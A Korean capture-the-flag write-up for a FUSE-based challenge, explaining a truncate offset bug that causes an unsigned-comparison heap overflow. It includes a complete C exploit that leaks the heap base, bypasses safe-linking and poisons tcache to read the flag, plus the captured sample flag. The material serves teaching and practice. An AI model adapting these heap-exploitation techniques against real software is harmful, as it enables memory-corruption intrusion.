# secret file

# Usage

# Concept

- `FUSE` , heap overflow
- 문제를 실행하기 위해서 호스트 시스템에 FUSE 가 설치되어있어야 합니다. (apt install fuse)

# Writeup

FUSE(File system in User SpacE) 는 가상의 유저 영역에서 동작하는 파일 시스템을 구현시켜주는 인터페이스다. 이를 이용하면 특정 디렉토리를 마운팅 시켜서 유저가 원하는 대로 파일 시스템을 구현할 수 있다. 본 문제에서는 이를 이용해서 flag 를 읽지 못하게 세팅했다. 

문제에서 제공하는 ssh 계정으로 접속하면 아래처럼 flag 파일을 볼 수 있으나, 읽을 수 없다. 

```cpp
---------- 1 secret secret 48 Jan  1  1970 flag
```

문제의 취약점은 `truncate` 함수에서 발생한다. 파일의 크기를 줄이는 경우에 파일의 offset 을 변경하지 않기 때문에 heap overflow 가 가능하다. 

```cpp
static int virtual_truncate(const char* path, off_t off){
    virtual_file* file = get_file(path);
    if (!file)
        return -ENOENT;
    file->data = realloc(file->data, off); 
    file->size = off;
    if (off == 0){
        for (int i = 0; i < 20; i++){
            if (file_list[i] && !strcmp(file_list[i]->path, path)){
                free(file_list[i]);
                file_list[i] = NULL;
                break;
            }
        }
    }
    return 0;
}
```

또한 할당 받은 메모리를 초기화 하지 않는다는 점에서, 기존의 더미값의 유출을 이용해서 heap 주소를 leak 할 수 있는 벡터가 있다. 서버의 환경이 Ubuntu 22.04 이기 때문에 Safe-linking 이 걸려있지만 PIE가 문제에 걸려있지 않기 때문에 매우 높은 확률로 주소를 맞출 수 있다. 

leak 이후 파일의 크기를 `truncate` 또는 `write` 으로 크기를 늘려주고 다시 `truncate` 를 통해서 파일의 크기를 줄이게 되면 `file->size file->offset` 은 `file→offset` 이 0으로 초기화 되지 않는 이상 음수인데, size_t 자료형으로 인해서 부호없는 비교가 일어나게 되고 if문이 항상 거짓이되어 통과된다. 이 과정 이후에 `memcpy` 에서 힙 버퍼오버플로우를 트리거 할 수 있다. 

```cpp
if (size > file->size - file->offset){
      size_t origin = file->size;
      file->size = size;
      if (file->size >= 0x5000){
          file->size = origin;
          return -ENOMEM;
      }                
      file->data = realloc(file->data, file->size);
  }    
  memcpy(file->data + file->offset, buf, size);
```

적절한 힙풍수를 이용해서 tcache 청크의 fd 를 flag의 주소로 바꿔주면 새로운 파일을 할당 할 때 flag 의 주소를 data 로 설정하게 되면서 새로 만든 파일의 내용에 flag가 담겨있게 된다.

익스플로잇 코드는 아래와 같으며 C언어로 작성되었다. 

```cpp
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

size_t enc(size_t new, size_t old){
        return (new >> 12) ^ old;
}

int main(){
        char* buf = malloc(0x1000);
        memset(buf, 0, 0x1000);
        int fd = open("/super_secret/a", O_RDWR | O_CREAT);
        close(fd);
        int fd2 = open("/super_secret/b", O_RDWR | O_CREAT);
        close(fd2);
        truncate("/super_secret/a", 0);
        truncate("/super_secret/b", 0);
        fd = open("/super_secret/c", O_RDWR | O_CREAT);
        size_t addr;
        read(fd, &addr, 8);
        addr -= 0x22000;
        addr &= 0xFFFFF000;
        printf("heap base : %#llx\n", addr);
        fd2 = open("/super_secret/aa", O_RDWR | O_CREAT);
        truncate("/super_secret/aa", 0x1000);
        write(fd2, buf, 0x510);
        truncate("/super_secret/aa", 0x500);
        int fd3 = open("/super_secret/e", O_RDWR | O_CREAT);
        int fd4 = open("/super_secret/d", O_RDWR | O_CREAT);
        close(fd3);
        close(fd4);
        truncate("/super_secret/e", 0);
        truncate("/super_secret/d", 0);
        size_t heap1 = addr + 0x021aa0 + 0x10; //0x40 size heap
        size_t heap2 = addr + 0x021ae0 + 0x10; //0x40 size heap
        size_t heap3 = addr + 0x021b20 + 0x10; //0x110 size heap
        size_t flag = 0x404090; //flag address
        size_t* ptr = (size_t*)buf;
        *ptr++ = enc(heap1, 0);
        *ptr++ = 0;
        ptr += 5;
        *ptr++ = 0x41;
        *ptr++ = enc(heap2, heap1);
        *ptr = 0;
        ptr += 7;
        *ptr++ = enc(heap3, flag);
        *ptr++ = 0x0;
        write(fd2, buf, 0xb0);
        int fd5 = open("/super_secret/cccc", O_RDWR | O_CREAT);
        int fd6 = open("/super_secret/fake_flag", O_RDWR | O_CREAT);
}
```

익스플로잇에 성공할 경우 /super_secret 폴더 아래의 fake_flag 파일을 열면 플래그가 보인다.

```cpp
$ cat /super_secret/fake_flag
hspace{this_is_sample_flag__________}K@�@�@�@�@�@�@$
```